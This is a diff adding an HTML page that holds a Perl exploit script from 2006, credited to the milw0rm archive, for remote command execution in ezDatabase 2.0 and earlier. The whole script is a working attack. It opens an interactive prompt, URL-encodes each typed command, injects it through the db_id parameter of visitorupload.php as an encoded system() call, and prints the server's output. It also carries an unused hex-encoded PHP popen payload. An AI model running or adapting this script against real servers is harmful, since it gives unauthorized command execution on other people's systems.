@@ -1,0 +1,92 @@
+<html>
+<head>
+<title>ezDatabase <= 2.0 (db_id) Remote Command Execution Exploit</title>
+<pre>
+#!/usr/bin/perl
+#
+# ezDatabase Remote Command Execution Exploit
+# based on advisory by Pridels Team
+#
+# Copyright (c) 2006 cijfer &lt;cijfer@netti!fi&gt;
+# All rights reserved.
+#
+# never ctrl+c again.
+# cijfer$ http://target.com/dir
+# host changed to 'http://target.com/dir'
+# cijfer$ 
+#
+# $Id: cijfer-ezdbxpl.pl,v 0.1 2006/01/21 019:22:00 cijfer Exp $
+
+use LWP::UserAgent;
+use URI::Escape;
+use Getopt::Long;
+use Term::ANSIColor;
+
+$res  = GetOptions(&quot;host=s&quot; =&gt; \$host, &quot;proxy=s&quot; =&gt; \$proxy, &quot;verbose+&quot; =&gt; \$verbose);
+&amp;usage unless $host;
+
+while()
+{
+	print color(&quot;green&quot;), &quot;cijfer\$ &quot;, color(&quot;reset&quot;);
+	chomp($command = &lt;STDIN&gt;);
+	exit unless $command;
+	if($command =~ m/^http\:\/\/(.*)/g)
+	{
+		$host=&quot;http://&quot;.$1;
+		print &quot;host changed to '&quot;;
+		print color(&quot;bold&quot;), $host.&quot;'\n&quot;, color(&quot;reset&quot;);
+	}
+	&amp;exploit($command,$host);
+}
+
+sub usage
+{
+	print &quot;ezDatabase Remote Command Execution Exploit\n&quot;;
+	print &quot;Usage: $0 -hp [OPTION]...\n\n&quot;;
+	print &quot;  -h --host\tfull address of target (ex. http://www.website.com/directory)\n&quot;;
+	print &quot;  -p --proxy\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n&quot;;
+	print &quot;  -v --verbose\tverbose mode\n\n&quot;;
+	exit;
+}
+
+sub exploit
+{
+	my($command,$host) = @_;
+
+	$cij=LWP::UserAgent-&gt;new() or die;
+	$cij-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101&quot;);
+	$cij-&gt;proxy(&quot;http&quot;, &quot;http://&quot;.$tunnel.&quot;/&quot;) unless !$proxy;
+
+	$string  = &quot;%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B&quot;;
+	$string .= uri_escape(shift);
+	$string .= &quot;%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F&quot;;
+	$execut  = &quot;%3C%3F%24%68%61%6E%64%6C%65%3D%70%6F%70%65%6E&quot;;
+	$execut .= &quot;%5C%28%24%5F%47%45%54%5B%63%69%6A%5D%2C%22%72&quot;;
+	$execut .= &quot;%22%29%3B%77%68%69%6C%65%28%21%66%65%6F%66%28&quot;;
+	$execut .= &quot;%24%68%61%6E%64%6C%65%29%29%7B%24%6C%69%6E%65&quot;;
+	$execut .= &quot;%3D%66%67%65%74%73%28%24%68%61%6E%64%6C%65%29&quot;;
+	$execut .= &quot;%3B%69%66%28%73%74%72%6C%65%6E%28%24%6C%69%6E&quot;;
+	$execut .= &quot;%65%29%3E%3D%31%29%7B%65%63%68%6F%22%24%6C%69&quot;;
+	$execut .= &quot;%6E%65%22%3B%7D%7D%70%63%6C%6F%73%65%28%24%68&quot;;
+	$execut .= &quot;%61%6E%64%6C%65%29%3B%3F%3E&quot;;
+
+	$out=$cij-&gt;get($host.&quot;/visitorupload.php?db_id=%3b%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%63%6d%64%5d%29&amp;cmd=&quot;.$string);
+
+	if($out-&gt;is_success)
+	{
+		@cij=split(&quot;_cijfer_&quot;,$out-&gt;content);
+		print substr(@cij[1],1);
+	}
+	if($verbose)
+	{
+		$recv=length $out-&gt;content;
+		print &quot;Total received bytes: &quot;.$recv.&quot;\n&quot;;
+		$sent=length $command;
+		print &quot;Total sent bytes: &quot;.$sent.&quot;\n&quot;;
+	}
+}
+
+# milw0rm.com [2006-01-22]
+</pre>
+</html>
+
